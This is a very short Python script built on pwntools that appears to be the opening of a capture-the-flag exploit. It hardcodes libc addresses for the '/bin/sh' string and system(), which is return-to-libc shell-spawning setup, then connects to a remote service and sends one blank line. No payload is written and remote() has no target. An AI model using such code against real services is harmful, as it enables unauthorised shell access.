from pwn import *

BIN_SH = 0x7ffff7f6304f
SYSTEM = 0x7ffff7e19920

r = remote()
r.sendlineafter(
    b'Ask me anything...\n', 
    b'\n'
)